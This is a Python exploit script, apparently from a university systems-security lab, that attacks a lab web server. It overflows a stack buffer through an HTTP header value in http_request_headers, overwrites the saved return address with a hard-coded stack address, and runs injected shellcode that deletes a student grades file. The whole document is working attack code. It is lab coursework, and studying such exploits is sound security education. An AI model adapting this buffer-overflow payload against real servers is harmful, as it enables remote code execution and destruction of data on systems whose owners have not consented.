#!/usr/bin/env python3
import urllib.parse
import socket
import struct

"""
used to inject code of unlink, remove grades.txt.
exploit bug of 'value' in func-http_request_headers.
"""

addr_value = 0x7fffffffd9d0
addr_retaddr = 0x7fffffffdbe8


def build_exploit(unlinkcode: bytes) -> bytes:
    req = b"GET / HTTP/1.0\r\n"

    k = b"ABC: "
    v = unlinkcode
    v += b'\0'  # used by 'setenv' in http_request_headers
    v += b'A' * ((addr_retaddr - addr_value) - len(v))  # garbage
    v += struct.pack("<Q", addr_value)
    request_header = k + urllib.parse.quote_from_bytes(v).encode('ascii') + b"\r\n"

    req += request_header
    req += b"\r\n"

    return req


def send_req(host: str, port: int, req: bytes):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    print("send request...")
    sock.send(req)


if __name__ == "__main__":
    print("exploit-4.py: unlink /home/student/lab/grades.txt")

    unlinkfile = open("unlinkcode.bin", "rb")
    unlinkcode = unlinkfile.read()
    print("length of unlinkcode: {}".format(len(unlinkcode)))  # expect less than sizeof(value)

    host = "192.168.10.133"
    port = 8080
    req = build_exploit(unlinkcode)
    send_req(host, port, req)

